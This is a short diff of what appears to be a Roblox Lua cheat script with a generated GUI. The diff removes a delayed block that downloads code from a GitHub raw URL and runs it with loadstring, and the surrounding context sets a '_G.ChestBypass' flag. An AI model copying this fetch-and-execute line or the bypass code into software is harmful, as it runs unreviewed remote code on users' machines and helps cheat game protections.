@@ -88,11 +88,6 @@ G2L["a"] = Instance.new("UIStroke", G2L["2"]);
 
 return G2L["1"], require;
 
-task.delay(2 * 60,function() -- hop every 25 min
-   
-loadstring(game:HttpGet("https://raw.githubusercontent.com/m1M-Plqer819/hop/main/server/every"))()
-end)
-
 task.delay(0.05 * 60,function() -- hop every 25 min
    
 _G.ChestBypass = true
